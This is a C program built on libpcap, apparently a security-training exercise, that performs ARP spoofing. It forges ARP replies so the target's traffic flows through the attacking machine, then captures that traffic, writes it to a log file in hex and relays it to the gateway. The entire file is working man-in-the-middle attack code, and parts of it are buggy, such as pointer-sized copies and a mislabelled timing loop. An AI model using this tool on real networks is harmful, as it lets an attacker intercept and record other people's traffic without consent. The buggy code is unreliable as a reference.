#include <pcap.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define spoofing_period 1
#define eth_src_mac 6
#define eth_protocol 12
#define eth_len 14
#define arp_operation 20
#define arp_src_mac 22
#define arp_dst_mac 32
#define arp_src_ip 28
#define arp_dst_ip 38
#define arp_packet_len 42

enum protoc{
    ipv4, ipv6, tcp, arp, arp_request, arp_reply
};
/*
enum arp__{
    arp_request, arp_reply
};
*/

unsigned int protocol_num[] = {0x0800, 0x0000, 0x06, 0x0806, 0x1, 0x2}; //not right

const char * protocol_name[] = {"ipv4", "ipv6", "tcp", "arp", "arp_request", "arp_reply"};

unsigned int offset = 0;

struct ether_addr
{
        unsigned char ether_addr_octet[6];
};

struct ether_header
{
        struct  ether_addr ether_dhost;
        struct  ether_addr ether_shost;
        unsigned short ether_type;
};

struct ip_header
{
        unsigned char ip_header_len:4;
        unsigned char ip_version:4;
        unsigned char ip_tos;
        unsigned short ip_total_length;
        unsigned short ip_id;
        unsigned char ip_frag_offset:5;
        unsigned char ip_more_fragment:1;
        unsigned char ip_dont_fragment:1;
        unsigned char ip_reserved_zero:1;
        unsigned char ip_frag_offset1;
        unsigned char ip_ttl;
        unsigned char ip_protocol;
        unsigned short ip_checksum;
        struct in_addr ip_srcaddr;
        struct in_addr ip_destaddr;
};

struct tcp_header
{
        unsigned short source_port;
        unsigned short dest_port;
        unsigned int sequence;
        unsigned int acknowledge;
        unsigned char ns:1;
        unsigned char reserved_part1:3;
        unsigned char data_offset:4;
        unsigned char fin:1;
        unsigned char syn:1;
        unsigned char rst:1;
        unsigned char psh:1;
        unsigned char ack:1;
        unsigned char urg:1;
        unsigned char ecn:1;
        unsigned char cwr:1;
        unsigned short window;
        unsigned short checksum;
        unsigned short urgent_pointer;
};

int set_ether(struct ether_header *eh, protoc p)
{
    unsigned short ether_type = ntohs(eh->ether_type);
    eh->ether_type = ether_type;
    if(ether_type != protocol_num[p])
    {
        printf("not %s protocol", protocol_name[p]);
        return 0;
    }
    return 1;
}

void ether_print(struct ether_header * eh)
{
    printf("-----------------------------------\n");
    printf("ethernet header\n");
    printf("Src MAC Adress [%02x:%02x:%02x:%02x:%02x:%02x]\n", eh->ether_shost.ether_addr_octet[0], eh->ether_shost.ether_addr_octet[1], eh->ether_shost.ether_addr_octet[2],
            eh->ether_shost.ether_addr_octet[3], eh->ether_shost.ether_addr_octet[4], eh->ether_shost.ether_addr_octet[5]);
    printf("Dst MAC Adress [%02x:%02x:%02x:%02x:%02x:%02x]\n\n", eh->ether_dhost.ether_addr_octet[0], eh->ether_dhost.ether_addr_octet[1], eh->ether_dhost.ether_addr_octet[2],
            eh->ether_dhost.ether_addr_octet[3], eh->ether_dhost.ether_addr_octet[4], eh->ether_dhost.ether_addr_octet[5]);
    //printf("protocol : %s", protocol_name[eh->ether_type])
}

int set_ipv4(struct ip_header * ih, protoc p)
{
    if(ih->ip_version != 0x4)
    {
        printf("not ipv4\n");
        return 0;
    }

    if(protocol_num[p]!=ih->ip_protocol)
    {
        printf("not %s\n", protocol_name[p]);
        return 0;
    }

    offset = ih->ip_header_len*4;
   // printf("ip header length = %d\n", offset);
    return 1;
}

void ip_print(struct ip_header * ih)
{
    printf("-----------------------------------\n");
    printf("IP header");
    printf("IPv%d\n", ih->ip_version);
    printf("Src IP Adress : %s\n", inet_ntoa(ih->ip_srcaddr));
    printf("Dst IP Adress : %s\n\n", inet_ntoa(ih->ip_destaddr));
}

void tcp_print(struct tcp_header * th)
{
    printf("-----------------------------------\n");
    printf("TCP header\n");
    printf("Src Port : %hu\n",ntohs(th->source_port));
    printf("Dst Port : %hu\n", ntohs(th->dest_port));
}


int arp_reply_extract(const u_char * packet, char* DIP, struct ether_addr * dmac)
{
    //const u_char * packet = packet_;
    //packet = (u_char *)malloc(43*sizeof(u_char));
    //memcpy(packet, packet_, 42);

    struct ether_header * eh;
    struct sockaddr_in sa;

    eh = (struct ether_header *)(packet);

    //if not arp drop
    if(ntohs(  (eh->ether_type)  ) != protocol_num[arp])
    {
        printf("protocol : %2x\n", ntohs(  (eh->ether_type)  ));
        return 0;
    }
    //if not reply drop
    if(ntohs(*(unsigned short *)(packet + arp_operation )) != protocol_num[arp_reply])
    {
        printf("reply? : %2x\n", ntohs(*(unsigned short *)(packet+20)));
        return 0;
    }
    //if not right ip drop
    /*
    if(*(unsigned int *)(packet+28) != *(unsigned int *)DIP)
        return 0;
    */
    inet_pton(AF_INET, DIP, &(sa.sin_addr));
    if((*(unsigned int *)(packet+arp_src_ip)) != (*(unsigned int *)(&(sa.sin_addr))) )
    {
        printf("recieved ip : %x\n", (*(unsigned int *)(packet+arp_src_ip)));
        printf("target ip : %x\n", (*(unsigned int *)(&(sa.sin_addr))));
        return 0;
    }

    memcpy(dmac, packet+arp_src_mac, sizeof(dmac));
    //dmac = (struct ether_addr *)(packet + 22);
    return 1;
}

void arp_r_base_setting(u_char * packet, protoc rr)
{
    int i;
    for(i = 0; i<6; i++)
        packet[i] = 0xff;
    //set ethernet protocol to arp
    packet[12] = 0x08;
    packet[13] = 0x06;


    /*arp packet*/
    //ethernet
    packet[14] = 0x00;
    packet[15] = 0x01;
    //ipv4
    packet[16] = 0x08;
    packet[17] = 0x00;
    //HW size
    packet[18] = 0x06;
    //Protocol size
    packet[19] = 0x04;
    //arp request/reply
    packet[20] = 0x00;
    if(rr == arp_request)
        packet[21] = 0x01;
    else if (rr == arp_reply)
        packet[21] = 0x02;
    for(i = arp_dst_mac; i<38; i++)
        packet[i] = 0x00;


    //packet 6~11 : SMAC
    //packet 22~27 : SMAC
    //packet 28~31 : SIP
    //packet 39~42 : DIP
}


void arp_request_setting(u_char *packet, char * DIP, char *SMAC, char *SIP)
{
    FILE *fp;

    arp_r_base_setting(packet, arp_request);
    struct sockaddr_in sa;
    int i;

    //get SMAC
    system("ifconfig | grep \"HWaddr\" | awk -F \" \" '{print $5}' | head -n 1 > SMAC.txt");
    fp = fopen("SMAC.txt", "r");
    fscanf(fp, "%s", SMAC);
    fclose(fp);

    //get SIP
    system("ifconfig | grep \"inet addr\" | head -n 1 | awk -F\" \" '{print $2}' | awk -F \":\" '{print $2}' > SIP.txt");
    fp = fopen("SIP.txt", "r");
    fscanf(fp, "%s", SIP);
    fclose(fp);

    printf("SMAC : %s\n", SMAC);
    printf("SIP : %s\n", SIP);

    inet_pton(AF_INET, SIP, &(sa.sin_addr));

    //packet 6~11 : SMAC
    //packet 22~27 : SMAC
    //packet 28~31 : SIP
    //packet 38~41 : DIP
    memcpy(packet+arp_src_ip, &(sa.sin_addr), 4*sizeof(char));

    struct ether_addr smac;

    sscanf(SMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &(smac.ether_addr_octet[0]), &(smac.ether_addr_octet[1]),
           &(smac.ether_addr_octet[2]), &(smac.ether_addr_octet[3]),
           &(smac.ether_addr_octet[4]), &(smac.ether_addr_octet[5]));
    memcpy(packet+eth_src_mac, &(smac), sizeof(smac));
    memcpy(packet+arp_src_mac, &(smac), sizeof(smac));

    //DIP
    inet_pton(AF_INET, DIP, &(sa.sin_addr));
    memcpy(packet+arp_dst_ip, &(sa.sin_addr), 4*sizeof(char));
    for(i=0; i<arp_packet_len; i++)
        printf("%x ", *(packet + i));
    printf("\n\n");
}

int arp_recovery_detection(const u_char * packet, char * DIP)
{

    if(packet==NULL)
        return 0;

    struct sockaddr_in sa;
    struct ether_header * eh;

    eh = (struct ether_header *)(packet);

    bool right_sip = false;
    bool right_dip = false;

    //if not arp drop
    if(ntohs(  (eh->ether_type)  ) != protocol_num[arp])
    {
        //printf("protocol : %2x\n", ntohs(*(unsigned short *)(packet+12)));
        return 0;
    }
    //if not request drop
    if(ntohs(*(unsigned short *)(packet+arp_operation)) != arp_request)
    {
        //printf("reply? : %2x\n", ntohs(*(unsigned short *)(packet+20)));
        return 0;
    }

    //if not right ip drop
    /*
    if(*(unsigned int *)(packet+28) != *(unsigned int *)DIP)
        return 0;
    */
    inet_pton(AF_INET, DIP, &(sa.sin_addr));

    right_sip = ( (*(unsigned int *)(packet+arp_src_ip)) == (*(unsigned int *)(&(sa.sin_addr))) );
    right_dip = ( (*(unsigned int *)(packet+arp_dst_ip)) == (*(unsigned int *)(&(sa.sin_addr))) );

    if( (right_sip || right_dip) )
    {
        //printf("");
        return 1;
    }

    return 0;
}


//not yet
void arp_spoof(u_char * packet, char * DIP, struct ether_addr dmac, char *SMAC, char *GIP)
{
    struct sockaddr_in sa;
    int i;

    arp_r_base_setting(packet, arp_reply);

    inet_pton(AF_INET, GIP, &(sa.sin_addr));

    //packet 6~11 : SMAC
    //packet 22~27 : SMAC
    //packet 28~31 : SIP
    //packet 38~42 : DIP
    memcpy(packet+arp_src_ip, &(sa.sin_addr), 4*sizeof(char));

    struct ether_addr smac;

    sscanf(SMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &(smac.ether_addr_octet[0]), &(smac.ether_addr_octet[1]),
           &(smac.ether_addr_octet[2]), &(smac.ether_addr_octet[3]),
           &(smac.ether_addr_octet[4]), &(smac.ether_addr_octet[5]));
    memcpy(packet+eth_src_mac, &(smac), sizeof(smac));
    memcpy(packet+arp_src_mac, &(smac), sizeof(smac));

    //DIP
    inet_pton(AF_INET, DIP, &(sa.sin_addr));
    memcpy(packet+arp_dst_ip, &(sa.sin_addr), 4*sizeof(char));


    //setting DMAC
    memcpy(packet, &(dmac), sizeof(dmac));
    memcpy(packet+arp_dst_mac, &(dmac), sizeof(dmac));
    for(i=0; i<arp_packet_len; i++)
        printf("%x ", *(packet + i));
    printf("\n\n");
}

void get_gip(char * GIP)
{
    FILE *fp;
    system("route -n | grep UG | awk -F \" \" '{print $2}' > GIP.txt");
    fp = fopen("GIP.txt", "r");
    fscanf(fp, "%s", GIP);
    printf("GIP : %s\n", GIP);
}


int arp_get_sender_packet(const u_char * packet, char * DIP, struct ether_addr *dmac, FILE *fp)
{
    struct ip_header * iph;
    int plen;
    struct sockaddr_in sa;
    int i;

    struct ether_header * eh;
    eh = (struct ether_header *)(packet);

    if(packet==NULL)
        return 0;

    //if not ip drop
    if(ntohs(  (eh->ether_type)  ) != protocol_num[ipv4])
    {
        //printf("protocol : %2x\n", ntohs(*(unsigned short *)(packet+12)));
        return 0;
    }

    //if eth_dst is not me, drop
    //ddddddddddddddddddddddddddddddddddddd this is little weird
    if(!memcmp(&(eh->ether_dhost), dmac, 6))
    {
        //printf("this is already relayed packet\n");
        return 0;
    }

    iph = (struct ip_header *)(packet + eth_len);

    //if not right ip drop

    inet_pton(AF_INET, DIP, &(sa.sin_addr));
    //printf("shit\n");
    if((*(unsigned int *)(&(iph->ip_srcaddr))) != (*(unsigned int *)(&(sa.sin_addr))) )
    {
        //printf("%08x\n", *(unsigned int *)(&(iph->ip_srcaddr)));
        //printf("%08x\n", *(unsigned int *)(&(sa.sin_addr)));
        return 0;
    }

    //get only ip packet

    printf("\n\n--------get sender ip packet------------\n");

    plen = ntohs(iph->ip_total_length) + eth_len;
    fprintf(fp, "captured packet\n");
    printf("captured packet\n");
    for(i = 0; i<plen; i++)
    {
        fprintf(fp, "%02x ", *(packet+i));
        printf("%02x ", *(packet+i));
        if(i%16 == 15)
        {
            fprintf(fp, "\n");
            printf("\n");
        }
    }
    return 1;
}

void sender_relay(const u_char * packet, struct ether_addr gmac, char *GIP, pcap_t *handle)
{
    struct ether_header *eh;
    struct ip_header *ih;
    int plen;
    int i;

    eh = (struct ether_header *)(packet);
    ih = (struct ip_header *)(packet + eth_len);

    eh->ether_dhost = gmac;

    plen = ntohs(ih->ip_total_length) + eth_len;
    printf("\n************realyed packet***************\n");
    for(i = 0; i<plen; i++)
    {
        printf("%02x ", *(packet+i));
        if(i%16 == 15)
        {
            printf("\n");
        }
    }

    pcap_sendpacket(handle, packet, plen);
}

int main(int argc, char * argv[]) //int main(int argc, char *argv[])
{
    //pcap_t *arp_r;
    //u_char arp_request_packet[50] = {0, };
    //u_char arp_reply_packet[50] = {0, };
    //u_char arp_spoof_packet[50] = {0, };
    u_char * arp_request_packet;
    u_char * arp_reply_packet;
    u_char * arp_spoof_packet;

    arp_request_packet = (u_char *)calloc(50, sizeof(u_char));
    arp_reply_packet = (u_char *)calloc(50, sizeof(u_char));
    arp_spoof_packet = (u_char *)calloc(50, sizeof(u_char));


    char DIP[20] = {0, };
    struct ether_addr *dmac;
    struct ether_addr *gmac;
    dmac = (ether_addr*)malloc(sizeof(ether_addr));
    gmac = (ether_addr*)malloc(sizeof(ether_addr));

    char SMAC[30] = {0,};
    char SIP[20] = {0,};
    //gateway ip
    char GIP[20] = {0,};

    setbuf(stdout, NULL);

   //printf("started\n\n");
   pcap_t *handle;			/* Session handle */
   char *dev;			/* The device to sniff on */
   char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
   struct bpf_program fp;		/* The compiled filter */
   char filter_exp[] = "";	/* The filter expression */
   bpf_u_int32 mask;		/* Our netmask */
   bpf_u_int32 net;		/* Our IP */
   struct pcap_pkthdr header;	/* The header that pcap gives us */
   const u_char *packet;		/* The actual packet */

   //hyojun
   struct ether_header *eh;
   struct ip_header *ih;
   struct tcp_header * th;

   pcap_if_t *alldevs = NULL;

   int i, got_reply;

   char track[] = "취약점";
   char name[] = "신효준";

   clock_t start, finish;
   double duration;

   FILE * fp_spoofed_packet = fopen("catpured_packet.txt", "w");

   printf("[bob5][%s]pcap_test[%s]\n\n", track, name);

   //gip get
   get_gip(GIP);

   //printf("enter DIP\n");
   //scanf("%s", DIP);
   //fflush(stdin);

   //DIP = argv[1];
   //printf("DIP : %s", argv[1]);
   //DIP = argv[1];
   memcpy(DIP, argv[1], 16*sizeof(char));
   printf("DIP : %s\n", DIP);
   //arp request packet
   arp_request_setting(arp_request_packet, DIP, SMAC, SIP);

   // find all network adapters
       if (pcap_findalldevs(&alldevs, errbuf) == -1) {
           printf("dev find failed\n");
           return -1;
       }
       if (alldevs == NULL) {
           printf("no devs found\n");
           //return -1;
       }
       // print them
       pcap_if_t *d;
       for (d = alldevs, i = 0; d != NULL; d = d->next) {
           printf("%d-th dev: %s ", ++i, d->name);
           if (d->description)
               printf(" (%s)\n", d->description);
           else
               printf(" (No description available)\n");
       }

       int inum;

       printf("enter the interface number: ");
       scanf("%d", &inum);
       for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++); // jump to the i-th dev



   /* Define the device */

   dev = d->name;
   /* Find the properties for the device */
   if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
       fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
       net = 0;
       mask = 0;
   }
   /* Open the session in promiscuous mode */
   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == NULL) {
       fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
       return(2);
   }



   //arp reply -> extract dmac

   //send arp request and get reply => get dmac
   got_reply = 0;
   printf("now ask damc\n");

   while(1)
   {

       pcap_sendpacket(handle, arp_request_packet, arp_packet_len);
       printf("sent arp_reqeust\n");

       packet = pcap_next(handle, &header);
       if(packet==NULL)
           continue;

       if(arp_reply_extract(packet, DIP, dmac))
       {
           got_reply = 1;
           printf("got dmac\n");
           break;
       }


   }

   arp_request_setting(arp_request_packet, GIP, SMAC, SIP);

   while(1)
   {
       pcap_sendpacket(handle, arp_request_packet, arp_packet_len);
       printf("sent arp_reqeust\n");

       packet = pcap_next(handle, &header);
       if(packet==NULL)
           continue;

       if(arp_reply_extract(packet, GIP, gmac))
       {
           got_reply = 1;
           printf("%x\n", *(unsigned long long *)gmac);
           printf("got gateway mac\n");
           break;
       }
   }
   /*
   while(1)
   {
       start = clock();
       while(1)
       {
           finish = clock();
           duration = (double)(finish-start)/CLOCKS_PER_SEC;
           if(duration > 1)
               break;
       }
       printf("time : %lf", duration);
   }
*/
   printf("now start spoof\n");

   //make spoofing packet
   arp_spoof(arp_spoof_packet, DIP, *dmac, SMAC, GIP);

   //spoofing
   while(1)
   {
       start = clock();
       while(1)
       {
           //printf("doing!");
           packet = pcap_next(handle, &header);

           if(arp_recovery_detection(packet, DIP))
           {
               printf("\nrecovery detected\n");
               break;
           }

           if(arp_get_sender_packet(packet, DIP, dmac, fp_spoofed_packet))
           {
               finish = clock();
               sender_relay(packet, *gmac, GIP, handle);
           }

           finish = clock();
           duration = (double)(finish-start)/CLOCKS_PER_SEC;
           //printf("time : %lf", duration);
           if(duration >  0.00001)
               break;
       }
       printf("1 sec past\n");
       pcap_sendpacket(handle, arp_spoof_packet, arp_packet_len);
       printf("send spoof\n");

       //sleep(spoofing_period);
   }if(arp_get_sender_packet(packet, DIP, dmac, fp_spoofed_packet))
       printf("get sender packet\n");

   pcap_close(handle);
   return(0);

}
